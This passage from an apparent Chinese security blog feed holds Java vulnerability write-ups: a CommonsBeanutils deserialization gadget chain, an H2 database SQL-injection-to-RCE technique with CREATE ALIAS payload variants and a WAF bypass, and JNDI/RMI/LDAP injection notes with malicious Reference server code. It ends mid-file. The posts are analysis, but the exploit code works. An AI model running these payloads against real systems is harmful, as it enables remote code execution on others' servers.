<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study.exp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutilsEXP</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommonsBeanutilsEXP</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        System.out.println(<span class="string">"Hello TemplatesImpl"</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a Calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后用 <code>javassist</code> 将恶意类通过反射的方法插入到 <code>TemplatesImpl</code> 的 <code>_bytecodes</code> 的变量中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Boolean.parseBoolean(System.getProperty(<span class="string">"properXalan"</span>, <span class="string">"false"</span>)) ? createTemplatesImpl( Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>), Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>)) : createTemplatesImpl(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span><span class="params">(Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    T templates = tplClass.newInstance();</span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    setFieldValue(templates, <span class="string">"_bytecodes"</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;</span><br><span class="line">            ClassPool.getDefault().get(CommonsBeanutilsEXP.class.getName()).toBytecode()</span><br><span class="line">    &#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后实例化 <code>org.apache.commons.beanutils.BeanComparator</code> 并作为 <code>PriorityQueue</code> 的比较器，然后通过反射的方式将构造的 <code>TemplatesImpl</code> 放入 <code>PriorityQueue</code> 的参数即可：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Object templates = createTemplatesImpl();</span><br><span class="line">    <span class="comment">// mock method name until armed</span></span><br><span class="line">    <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    <span class="comment">// stub data for replacement later</span></span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// switch method called by comparator</span></span><br><span class="line">    setFieldValue(comparator, <span class="string">"property"</span>, <span class="string">"outputProperties"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    setFieldValue(queue, <span class="string">"queue"</span>, <span class="keyword">new</span> Object[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">    tools.Deserialize(queue);</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1620289379545.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[某mobile RCE分析]]></title>
      <url>//blog/1618536577650.html</url>
      <content type="html"><![CDATA[<p>原本是个SQL注入,因为后端是H2数据库，所以最后能够通过执行代码达到RCE的效果。<br><a id="more"></a></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>注入点就比较常规了，在 <code>MessageTypeAction</code>类中的 <code>messageType</code> 方法：</p>
<p><img src="http://x-f1v3.github.io/images/1618536657378.png" alt="image"></p>
<p>传入 <code>typeName</code> 参数，然后进入 <code>this.mobileService.getMessageTypeList</code> 方法，跟进该方法，发现直接带入了 SQL 语句造成了注入漏洞：<br><img src="http://x-f1v3.github.io/images/1618536680731.png" alt="image"></p>
<h2 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h2><p>因为后端使用 H2 数据库，所以可以利用h2数据库的 <code>CREATE ALIAS</code> 创建一个 java 函数然后调用它.<br><img src="http://x-f1v3.github.io/images/1618536689059.png" alt="image"></p>
<p>按照官方文档照这抄一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS </span><br><span class="line">$$ void e(String cmd) throws java.io.IOException </span><br><span class="line">&#123;java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);&#125;$$;</span><br><span class="line"></span><br><span class="line">CALL EXEC(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p>
<p>其中2个 <code>$$</code> 貌似是java代码的分隔符，由于 <code>CREATE ALIAS</code> 指令可以使用字符串作为java代码，所以完全可以变形为这样，输入单双引号作为分割：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC1 AS &apos;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&apos;; </span><br><span class="line"></span><br><span class="line">CALL EXEC1(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p>
<p>当然也可以使用 <code>CONCAT</code> 这样的内置函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS EXEC AS CONCAT(&apos;void e(String cmd) throws java.io.IOException&apos;,</span><br><span class="line">HEXTORAW(&apos;007b&apos;),&apos;java.lang.Runtime rt= java.lang.Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);&apos;,HEXTORAW(&apos;007d&apos;));</span><br><span class="line">CALL EXEC(&apos;whoami&apos;);</span><br></pre></td></tr></table></figure></p>
<p>用字符串类型的语句就可以很轻松的绕过 waf,效果更好。</p>
<p>最终的 payload 不用多说，因为 H2 支持堆叠，所以在注入点后面加上即可。</p>
<p>ps：很早就发现了注入，但是想的是获取账户权限，结果本身代码中有各种防注入过滤，没有成功，所以以为是个鸡肋的洞，结果可以通过H2数据库执行代码，还是太菜了…</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JNDI、RMI、JRMP、JMX]]></title>
      <url>//blog/1606639912007.html</url>
      <content type="html"><![CDATA[<p>具体资料各位大佬都有详细总结，这里算是一个记录笔记吧。<br><a id="more"></a></p>
<h2 id="Jndi"><a href="#Jndi" class="headerlink" title="Jndi"></a>Jndi</h2><p><code>Jndi</code> 全称是：<code>Java Naming and Directory Interface</code>，叫做Java命名和目录接口、SUN公司提供的一种标准的 Java 命名系统接口。</p>
<p><code>Jndi</code> 提供统一的客户端API，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>
<p>如图：</p>
<p><img src="http://x-f1v3.github.io/images/1606639939069.png" alt="image"></p>
<h3 id="Java-Naming"><a href="#Java-Naming" class="headerlink" title="Java Naming"></a>Java Naming</h3><p>命名服务是一种键值对的绑定，是应用程序可以通过键检索值。</p>
<h3 id="Java-Directory"><a href="#Java-Directory" class="headerlink" title="Java Directory"></a>Java Directory</h3><p>目录服务是命名服务的自然扩展。两者之间的关键差别是目录服务中对象可以有属性（例如，用户有email地址），而命名服务中对象没有属性。</p>
<p>因此，在目录服务中，你可以根据属性搜索对象。JNDI 允许你访问文件系统中的文件，定位远程 RMI 注册的对象，访问象 LDAP 这样的目录服务，定位网络上的 EJB 组件</p>
<p><code>JNDI</code> 类似于一个索引中心，它允许客户端通过 <code>name</code> 发现和查找数据和对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。</p>
<p>示例代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String jndiName= ...;//指定需要查找name名称</span><br><span class="line">Context context = new InitialContext();//初始化默认环境</span><br><span class="line">DataSource ds = (DataSourse)context.lookup(jndiName);//查找该name的数据</span><br></pre></td></tr></table></figure></p>
<h3 id="Jndi-Naming-Reference"><a href="#Jndi-Naming-Reference" class="headerlink" title="Jndi Naming Reference"></a>Jndi Naming Reference</h3><p>java为了将object对象存储在Naming或者Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming和Directory服务下，比如（rmi，ldap等）。在使用Reference的时候，我们可以直接把对象写在构造方法中，当被调用的时候，对象的方法就会被触发。理解了jndi和jndi reference后，就可以理解jndi注入产生的原因了。</p>
<h3 id="Jndi注入"><a href="#Jndi注入" class="headerlink" title="Jndi注入"></a>Jndi注入</h3><p>jndi注入产生的原因</p>
<blockquote>
<p>1、lookup参数可控。</p>
<p>2、InitialContext类及他的子类的lookup方法允许动态协议转换</p>
<p>3、lookup查找的对象是Reference类型及其子类</p>
<p>4、当远程调用类的时候默认会在rmi服务器中的classpath中查找，如果不存在就会去url地址去加载类。如果都加载不到就会失败。</p>
</blockquote>
<p>lookup函数<br><img src="http://x-f1v3.github.io/images/1606639956772.png" alt="image"></p>
<p>说明即使 <code>Context.PROVIDER_UR</code> L参数被初为rmi://127.0.0.1:1099/foo,但是如果lookup的参数可控，那我们就可以重写url地址，使url地址指向我们的服务器。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// Create the initial context</span><br><span class="line"></span><br><span class="line">   Hashtable env = new Hashtable();</span><br><span class="line"></span><br><span class="line">   env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line"></span><br><span class="line">    &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line"></span><br><span class="line">   env.put(Context.PROVIDER_URL, &quot;rmi://secure-server:1099&quot;);</span><br><span class="line"></span><br><span class="line">   Context ctx = new InitialContext(env);</span><br><span class="line"></span><br><span class="line">   // Look up in the local RMI registry</span><br><span class="line"></span><br><span class="line">   Object local_obj = ctx.lookup(&lt;attacker controlled&gt;);</span><br></pre></td></tr></table></figure></p>
<p>就可以实现远程加载恶意的对象，实现远程代码执行。</p>
<p>我们发现存在3种方法，可以通过<strong>jndi注入导致远程代码执行</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rmi、通过jndi reference远程调用object方法。</span><br><span class="line"></span><br><span class="line">CORBA IOR 远程获取实现类</span><br><span class="line"></span><br><span class="line">LDAP 通过序列化对象，JNDI Referene，ldap地址</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1606639970605.png" alt="image"></p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p>
<h3 id="绕过JDK-8u191-等高版本限制"><a href="#绕过JDK-8u191-等高版本限制" class="headerlink" title="绕过JDK 8u191+等高版本限制"></a>绕过JDK 8u191+等高版本限制</h3><p>所以对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下：</p>
<p>1、 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。<br>2、利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。<br>这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。</p>
<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI（Remote Method Invocation） 即Java远程方法调用，一种用于实现远程过程调用的应用程序编程接口，常见的两种接口实现为JRMP（Java Remote Message Protocol，Java远程消息交换协议）以及CORBA。</p>
<p>Server端<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">    import javax.naming.Reference;</span><br><span class="line"></span><br><span class="line">    import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">    import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">    public class SERVER &#123;</span><br><span class="line"></span><br><span class="line">    public SERVER() &#123;</span><br><span class="line"></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line"></span><br><span class="line">        Reference aa = new Reference(&quot;ExecObj&quot;, &quot;ExecObj&quot;, &quot;http://127.0.0.1:8081/&quot;);</span><br><span class="line"></span><br><span class="line">        ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;Binding &apos;refObjWrapper&apos; to &apos;rmi://127.0.0.1:1099/aa&apos;&quot;);</span><br><span class="line"></span><br><span class="line">        registry.bind(&quot;aa&quot;, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。<br>Reference 中几个比较关键的属性：</p>
<ul>
<li>className - 远程加载时所使用的类名</li>
<li>classFactory - 加载的 class 中需要实例化类的名称</li>
<li>classFactoryLocation - 提供 classes 数据的地址可以是 file/ftp/http 等协议</li>
</ul>
<p>例如这里定义一个 Reference 实例，并使用继承了 UnicastRemoteObject 类的 ReferenceWrapper 包裹一下实例对象，使其能够通过 RMI 进行远程访问</p>
<p>Client端：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.Context;</span><br><span class="line"></span><br><span class="line">    import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">    public class CLIENT &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        String uri = &quot;rmi://127.0.0.1:1099/aa&quot;;</span><br><span class="line"></span><br><span class="line">        Context ctx = new InitialContext();</span><br><span class="line"></span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当有客户端通过 lookup(uri) 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个 Reference 实例，客户端会首先去本地的 CLASSPATH 去寻找被标识为 refClassName 的类，如果本地未找到，则会去请求 <a href="http://example.com:12345/refClassName.class" target="_blank" rel="noopener">http://example.com:12345/refClassName.class</a> 动态加载 classes 并调用 insClassName 的构造函数。在构造函数里面实现你的exp。</p>
<p>ExecObj：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">package com.jndi.cn;</span><br><span class="line"></span><br><span class="line">    import java.io.BufferedReader;</span><br><span class="line"></span><br><span class="line">    import java.io.IOException;</span><br><span class="line"></span><br><span class="line">    import java.io.InputStream;</span><br><span class="line"></span><br><span class="line">    import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">    import java.io.Reader;</span><br><span class="line"></span><br><span class="line">    import javax.print.attribute.standard.PrinterMessageFromOperator;</span><br><span class="line"></span><br><span class="line">    public class ExecTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException,InterruptedException&#123;</span><br><span class="line"></span><br><span class="line">        String cmd=&quot;whoami&quot;;</span><br><span class="line"></span><br><span class="line">        final Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line"></span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line"></span><br><span class="line">        int value=process.waitFor();</span><br><span class="line"></span><br><span class="line">        System.out.println(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void printMessage(final InputStream input) &#123;</span><br><span class="line"></span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line"></span><br><span class="line">        new Thread (new Runnable() &#123;</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line"></span><br><span class="line">            public void run() &#123;</span><br><span class="line"></span><br><span class="line">                // TODO Auto-generated method stub</span><br><span class="line"></span><br><span class="line">                Reader reader =new InputStreamReader(input);</span><br><span class="line"></span><br><span class="line">                BufferedReader bf = new BufferedReader(reader);</span><br><span class="line"></span><br><span class="line">                String line = null;</span><br><span class="line"></span><br><span class="line">                try &#123;</span><br><span class="line"></span><br><span class="line">                    while ((line=bf.readLine())!=null)</span><br><span class="line"></span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        System.out.println(line);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;catch (IOException  e)&#123;</span><br><span class="line"></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;).start();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>首先javac ExecObj、将生成的class文件放在web服务器目录下。然后依次执行server端，client端</p>
<p><img src="http://x-f1v3.github.io/images/1606640000334.png" alt="image"></p>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。<br>且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false。</p>
<p>LdapServer.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line"></span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import 